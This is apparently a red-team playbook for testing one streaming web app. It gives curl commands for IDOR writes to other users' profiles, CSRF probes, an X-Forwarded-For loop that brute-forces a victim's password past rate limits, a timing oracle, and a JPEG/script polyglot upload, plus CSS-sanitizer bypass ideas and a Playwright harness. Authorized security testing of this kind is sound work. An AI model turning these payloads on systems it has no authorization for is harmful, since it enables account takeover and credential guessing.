# Payloads & recipes

Concrete ways to poke this stack. Everything runs from `/tmp/redteam/`, against the local or a
user-named target. Make your own `redteam-*` accounts. Replace `$BASE` with `https://<PUBLIC_IP>`
(local) or the URL the user gave.

```bash
mkdir -p /tmp/redteam && cd /tmp/redteam
BASE="https://127.0.0.1"          # or the authorized target
J=/tmp/redteam/jar.txt            # cookie jar
curl() { command curl -sk "$@"; } # -k: the local stack uses a self-signed cert
```

## Accounts & the login cookie

```bash
# sign up a disposable attacker
curl -c "$J" -X POST "$BASE/api/signup" -H 'content-type: application/json' \
  -d '{"name":"redteam-a","password":"correct horse battery"}' -i

# the cookie is login=<64 hex>, HttpOnly+Secure+SameSite=Lax. It rides along with -b "$J".
curl -b "$J" "$BASE/api/me"
```

## Authz / IDOR — act as someone you are not

```bash
# Victim is a claimed name. As attacker (or as NOBODY: drop -b), try to write their bio.
curl -b "$J" -X PUT "$BASE/api/streamers/victimname" \
  -H 'content-type: application/json' -d '{"bio":"owned by redteam"}' -i
# Expect 403 "that name has an account. log in as it". A 200 is account-write bypass (Critical).

# Stream control with a guessed session id but no token (ids are sequential, token is the secret).
curl -b "$J" -X POST "$BASE/api/streams/victimname/stop?session=1234&token=1" -i
# Expect 403 "not your session". A 200 means the token check is missing/weak (High+).

# Group power you should not have: try a mutating route on a group you did not join / lack the role.
curl -b "$J" -X POST "$BASE/api/groups/<group>/kick" \
  -H 'content-type: application/json' -d '{"name":"someone"}' -i
```

## CSRF / SameSite / Sec-Fetch

```bash
# Simulate a cross-site request: Lax still sends the cookie on top-level GET navigations.
# For each state-changing route, send it with a cross-site fetch header and see if it bites.
curl -b "$J" -X POST "$BASE/api/streamers/redteam-a/presence" \
  -H 'content-type: application/json' -H 'sec-fetch-site: cross-site' \
  -d '{"status":"dnd"}' -i
# Only /api/logout is gated by from_here(). If another damaging route acts on cross-site, note it.
```

## X-Forwarded-For — rate-limit evasion (only if the api port is reachable directly)

```bash
# client_ip() trusts the FIRST XFF hop. Against Caddy (443) this is overwritten and safe.
# If you can reach the api port directly (e.g. 4000 exposed), each spoofed ip is a fresh bucket:
for i in $(seq 1 30); do
  curl -X POST "http://<api-host>:4000/api/login" -H "x-forwarded-for: 10.0.0.$i" \
    -H 'content-type: application/json' -d '{"name":"victim","password":"guess'$i'"}' \
    -o /dev/null -w "%{http_code}\n"
done
# 401s all the way past the per-ip cap (100) = evasion. First confirm the port is actually open;
# if only 443/Caddy is reachable, this is not exploitable — say so.
```

## Username / timing oracle

```bash
# A missing name should cost ~the same as a wrong password (decoy_hash). Measure both.
curl -o /dev/null -w "exists?   %{time_total}s\n" -X POST "$BASE/api/login" \
  -H 'content-type: application/json' -d '{"name":"knownname","password":"x"}'
curl -o /dev/null -w "nonexist? %{time_total}s\n" -X POST "$BASE/api/login" \
  -H 'content-type: application/json' -d '{"name":"zzz-no-such","password":"x"}'
# A consistent, large gap is a name-enumeration oracle. (Note GET /api/streamers/<name> already
# reveals existence — so only a *timing* gap that reveals more, e.g. claimed-vs-free, is news.)
```

## Uploads — content-type / polyglot

```bash
# "Is it a jpeg" for icons = size + magic-byte prefix only (FF D8 FF). Build a polyglot that
# starts with the jpeg magic but carries active content, upload it, then fetch it back and read
# the response content-type and whether a browser would sniff it.
printf '\xff\xd8\xff\xee<script>alert(1)</script>' > poly.jpg
curl -b "$J" -X PUT "$BASE/api/streamers/redteam-a/avatar" \
  -H 'content-type: image/jpeg' --data-binary @poly.jpg -i
curl -b "$J" -I "$BASE/api/streamers/redteam-a/avatar?v=<version>"
# Served image/jpeg with no sniff header + a browser that sniffs = trouble. Check Caddy for
# X-Content-Type-Options: nosniff. For assets, test each allowed mime (png/jpeg/gif/webp) and try
# to sneak svg or text/html past the allowlist in profile.rs.
```

## About-page CSS sanitizer — the client showcase

`safeCss(css, scope)` runs in the browser. Test it where it lives, not with curl:

- In devtools on a page that imports it, or a tiny `/tmp/redteam/css.html` that imports the same
  logic, feed candidate payloads and inspect the returned `css` string + what actually renders.
- Payload families to try (goal: a declaration/selector that survives AND loads, runs, or escapes
  the box):
  - loaders the `BAD_VALUE` regex may miss: CSS functions other than `url/image-set/image/src/
    element/cross-fade/paint/expression` that fetch or compute from a resource.
  - escapes: backslash tricks that `BAD_VALUE` flags, but check the *parsed* re-emitted form for a
    decode the regex ran before the browser did (or after).
  - selector breakout: craft `selectorText` so `splitSelectors` + `#scope ` prefixing lets a rule
    match outside `#scope` (play with commas inside `()`/`[]`/quotes, stray `{`/`}`).
  - at-rules: anything other than `@media`/`@supports` should be dropped — confirm `@import`,
    `@font-face`, `@keyframes`, nested rules all die.
  - `position: fixed` is rewritten to `absolute` — check you cannot restore `fixed` via a longhand,
    a var, or `!important` ordering.
- Compare against `test/about.js`: whatever it already blocks is known-good; find the gap it misses.

## Links

```bash
# linkHref() allows only http/https. Confirm javascript:, data:, blob:, and whitespace/control
# variants become null and never render as an anchor href.
```

## A throwaway PoC harness (Playwright, like test/*.js)

When a repro needs a real browser or several HTTP identities, copy the shape of `test/groups.js`
into `/tmp/redteam/poc.js` and run it with the repo's test node:

```js
// /tmp/redteam/poc.js  — run: cd <repo>/test && BASE_URL=https://127.0.0.1 node /tmp/redteam/poc.js
const { request } = require('playwright');
(async () => {
  const BASE = process.env.BASE_URL || 'https://127.0.0.1';
  const attacker = await request.newContext({ baseURL: BASE, ignoreHTTPSErrors: true });
  const victim   = await request.newContext({ baseURL: BASE, ignoreHTTPSErrors: true });
  // ... sign up both, then attempt the cross-account action and assert the status you got.
})();
```

Save the transcript (request + response + status + timing) of every confirmed hit next to the
finding under `/tmp/redteam/`. That transcript is the human-reproducible proof the report needs.
